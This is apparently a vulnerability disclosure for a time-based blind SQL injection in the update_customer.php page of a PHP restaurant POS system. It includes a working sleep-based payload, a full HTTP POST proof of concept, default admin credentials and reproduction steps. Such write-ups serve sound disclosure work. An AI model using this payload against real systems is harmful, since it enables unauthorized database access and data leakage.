# Vulnerability Description

[Restaurant POS System v1.0](https://codeastro.com/restaurant-pos-system-in-php-with-source-code/) was discovered to contain a SQL injection vulnerability via the update_customer.php. It is an open source project from [campcodes.com](https://www.campcodes.com). This vulnerability can lead to database information leakage.

1. Vulnerability Submitter: Tr0e  
2. vendors: [Restaurant POS System in PHP with Source Code - CodeAstro](https://codeastro.com/restaurant-pos-system-in-php-with-source-code/)  
3. The program is built using the xmapp/v3.3.0 and PHP/8.1.10 version;  
4. Vulnerability location: /RestaurantPOS/Restro/admin/update_customer.php
  

# Vulnerability Verification

[+] Payload:

```java
test'and(select*from(select+sleep(3))a/**/union/**/select+1)='
```

POC：

```js
POST http://192.168.0.120:91/RestaurantPOS/Restro/admin/update_customer.php?update=dac2ad667158'and(select*from(select+sleep(3))a/**/union/**/select+1)=' HTTP/1.1
Host: 192.168.0.120:91
Content-Length: 130
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.120:91
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.0.120:91/RestaurantPOS/Restro/admin/update_customer.php?update=dac2ad667158
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=ldi7mdlvm8g7bnfhunuvrhp8ne
Connection: close

customer_name=Yao&customer_phoneno=13011113333&customer_email=123%40qq.com&customer_password=123456&updateCustomer=Update+Customer
```

## How to verify

1. Build the vulnerability environment according to the steps provided by the source code author ; 
2. log in to the "Admin Panel” through the default account and password（Email: [admin@mail.com](mailto:admin@mail.com) Password: codeastro.com）;
3. The vulnerability is located at the "Customers - Update" function, you should inserts Payload when you Update any customer's information，as shown in the following figure：

![image](https://user-images.githubusercontent.com/42080954/194768298-9f651a46-b1fe-4893-84da-93d3f916ed53.png)
![image](https://user-images.githubusercontent.com/42080954/194768392-da298111-c370-4f9d-ad39-4d3294ecc40c.png)

